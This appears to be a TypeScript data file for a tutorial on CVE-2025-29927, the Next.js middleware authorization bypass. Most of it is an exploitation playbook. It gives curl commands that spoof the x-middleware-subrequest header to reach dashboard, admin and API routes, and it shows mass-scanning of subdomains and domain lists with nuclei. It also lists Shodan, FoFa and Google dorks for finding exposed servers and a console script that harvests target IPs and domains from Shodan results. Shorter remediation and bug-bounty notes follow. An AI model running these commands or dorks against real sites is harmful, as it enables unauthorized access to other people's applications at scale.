export interface NextjsStep {
  id: string
  title: string
  description: string
  commands: { command: string; description: string }[]
  tools?: { name: string; url: string; description: string }[]
  tips?: string[]
}

export const nextjsSteps: NextjsStep[] = [
  {
    id: "introduction",
    title: "What is Middleware in Next.js?",
    description:
      "Middleware in Next.js intercepts incoming HTTP requests and processes them before they reach the final route handler. It is commonly used for authentication & authorization (checking if a user is logged in), logging & monitoring (tracking requests for analytics), and request modification (altering headers or query parameters).",
    commands: [],
    tips: [
      "Middleware runs before any route handler is executed",
      "It can modify requests, responses, or even block access entirely",
      "Common use cases: authentication checks, rate limiting, A/B testing, and analytics",
    ],
  },
  {
    id: "cve-2025-29927",
    title: "Understanding CVE-2025-29927",
    description:
      "CVE-2025-29927 is a critical authorization bypass vulnerability in Next.js middleware. By sending a specially crafted header, attackers can bypass all middleware checks and gain unauthorized access to protected routes.",
    commands: [
      {
        command: `export function middleware(req) {
  if (!req.cookies.token) {
    return new Response('Unauthorized', { status: 401 });
  }
  return NextResponse.next();
}`,
        description: "Example vulnerable middleware",
      },
      {
        command: "curl -H \"x-middleware-subrequest: middleware:middleware:middleware\" https://target.com/dashboard",
        description: "Basic bypass exploit",
      },
    ],
    tools: [
      {
        name: "Nuclei Template - CVE-2025-29927",
        url: "https://github.com/coffinxp/nuclei-templates/blob/main/CVE-2025-29927.yaml",
        description: "Official nuclei template by CoffinXP",
      },
      {
        name: "Vulnerability Disclosure",
        url: "https://nextjs.org/blog/cve-2025-29927",
        description: "Official Next.js security advisory",
      },
    ],
    tips: [
      "The vulnerability allows bypassing ALL middleware checks",
      "Affected versions: Next.js 12.x < 12.3.5, 13.x < 13.5.9, 14.x < 14.2.25, 15.x < 15.2.3",
      "Impact: unauthorized data access, privilege escalation, application takeover",
    ],
  },
  {
    id: "identifying",
    title: "Step 1: Identifying Vulnerable Middleware",
    description:
      "Before exploiting, you need to identify if the target is using Next.js and has vulnerable middleware. Use nuclei templates or manual probing.",
    commands: [
      {
        command: "echo target.com | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml",
        description: "Scan with Nuclei template",
      },
      {
        command: "subfinder -d target.com -all | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml",
        description: "Mass scan subdomains",
      },
      {
        command: "cat domains.txt | uro | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml",
        description: "Mass scan from domain list",
      },
    ],
    tools: [
      {
        name: "Nuclei Templates",
        url: "https://github.com/coffinxp/nuclei-templates",
        description: "Collection of CVE-2025-29927 templates",
      },
    ],
    tips: [
      "Look for Next.js patterns in responses: x-powered-by, _next/static",
      "Check for middleware-rewrite headers in responses",
      "Test manually if automated tools fail",
    ],
  },
  {
    id: "exploiting",
    title: "Step 2: Exploiting the Vulnerability",
    description:
      "Once you've identified a vulnerable target, exploit the authorization bypass to access protected routes. The vulnerability works by spoofing the x-middleware-subrequest header.",
    commands: [
      {
        command: "curl -v https://target.com/dashboard",
        description: "Test original request (expect 307 redirect)",
      },
      {
        command: "curl -H \"x-middleware-subrequest: middleware:middleware:middleware\" https://target.com/dashboard",
        description: "Bypass middleware with subrequest header",
      },
      {
        command: "curl -H \"x-middleware-subrequest: middleware:middleware:middleware\" https://target.com/api/admin",
        description: "Access API endpoints",
      },
      {
        command: "curl -H \"x-middleware-subrequest: middleware:middleware:middleware\" -H \"Cookie: session=valid\" https://target.com/admin",
        description: "With existing session cookie",
      },
    ],
    tips: [
      "Response 200 OK = Vulnerable! 307 Redirect = May still be vulnerable",
      "Try multiple endpoints - admin, dashboard, API routes",
      "Use Burp Suite for easier testing and response analysis",
    ],
  },
  {
    id: "burp-suite",
    title: "Step 3: Using Burp Suite",
    description:
      "Burp Suite provides a graphical interface for testing the vulnerability. Add the malicious header to intercept and modify requests.",
    commands: [
      {
        command: "x-middleware-subrequest: middleware:middleware:middleware:middleware",
        description: "Header to add in Burp Suite",
      },
      {
        command: "Enable Proxy > Options > Match and Replace > Add header",
        description: "Configure automatic header injection",
      },
    ],
    tips: [
      "Use Burp's Match & Replace to automatically add the header",
      "Easy to test multiple requests without manual curl commands",
      "Capture and analyze all responses in one place",
    ],
  },
  {
    id: "mass-hunting",
    title: "Step 4: Mass Hunting with Shodan",
    description:
      "For mass hunting, use Shodan to find servers potentially running vulnerable Next.js. Search for the x-middleware-rewrite header which indicates Next.js is in use.",
    commands: [
      {
        command: "x-middleware-rewrite",
        description: "Shodan search query for Next.js servers",
      },
      {
        command: "http.html:\"\/_next\/static\"",
        description: "Alternative Shodan dork",
      },
      {
        command: "cpe:\"cpe:2.3:a:zeit:next.js\"",
        description: "CPE-based search",
      },
      {
        command: "var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/['\"]/g,'').trim();/^(\\d{1,3}\\.){3}\\d{1,3}$/.test(t)?ips.push(t):/^(?!\\d+\\.)[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString='IPs:\\n'+ips.join('\\n')+'\\n\\nDomains:\\n'+domains.join('\\n'),a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(dataString);a.download='domains.txt';document.body.appendChild(a);a.click();",
        description: "Extract IPs/Domains from Shodan results",
      },
      {
        command: "cat domains.txt | uro | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml",
        description: "Scan extracted domains",
      },
    ],
    tools: [
      {
        name: "Shodan",
        url: "https://www.shodan.io",
        description: "Search engine for internet-connected devices",
      },
      {
        name: "URO - Unified Regex Replacer",
        url: "https://github.com/sixology/URO",
        description: "URL deduplication tool",
      },
    ],
    tips: [
      "Shodan returns ~15,000 results for x-middleware-rewrite",
      "Use domain filter for cleaner results",
      "Automate extraction with console script shown above",
    ],
  },
  {
    id: "dorks",
    title: "Dorks for Discovery",
    description:
      "Use these dorks to discover potentially vulnerable Next.js applications through search engines.",
    commands: [
      {
        command: "shodan query: x-middleware-rewrite",
        description: "Next.js server identification",
      },
      {
        command: "shodan query: http.html:\"\/_next\/static\"",
        description: "Static Next.js sites",
      },
      {
        command: "fofa: body=\"\/_next\/static\" AND \"x-middleware-rewrite\"",
        description: "FoFa search",
      },
      {
        command: "google: inurl:\"\/_next\" AND intext:\"next.config.js\" OR intext:\"Powered by Next.js\"",
        description: "Google dorks",
      },
      {
        command: "inurl:\"\/_next\" AND intext:\"next.config.js\"",
        description: "Alternative Google dork",
      },
    ],
    tips: [
      "Combine multiple search engines for better coverage",
      "Look for specific Next.js patterns in URLs",
      "Test discovered targets with nuclei or manual curl",
    ],
  },
  {
    id: "impact",
    title: "Impact of CVE-2025-29927",
    description:
      "This vulnerability has critical impact as it allows unauthorized access to any route protected by middleware. In severe cases, attackers can compromise the entire application.",
    commands: [
      {
        command: "Unauthorized Data Access: View private user information",
        description: "Impact #1",
      },
      {
        command: "Privilege Escalation: Gain administrative access without credentials",
        description: "Impact #2",
      },
      {
        command: "Application Takeover: Complete compromise in severe cases",
        description: "Impact #3",
      },
    ],
    tips: [
      "Always check ALL protected routes, not just obvious ones",
      "API endpoints often contain sensitive data",
      "Report to bug bounty programs for rewards",
    ],
  },
  {
    id: "remediation",
    title: "Remediation & Mitigation",
    description:
      "Next.js has released patches for all affected versions. Update to the latest version to remediate this vulnerability.",
    commands: [
      {
        command: "Next.js 15.x: Upgrade to 15.2.3 or later",
        description: "Fix for version 15",
      },
      {
        command: "Next.js 14.x: Upgrade to 14.2.25 or later",
        description: "Fix for version 14",
      },
      {
        command: "Next.js 13.x: Upgrade to 13.5.9 or later",
        description: "Fix for version 13",
      },
      {
        command: "Next.js 12.x: Upgrade to 12.3.5 or later",
        description: "Fix for version 12",
      },
    ],
    tips: [
      "Always keep Next.js updated to the latest version",
      "Check package.json for current version",
      "Consider-rate limiting as additional mitigation",
    ],
  },
]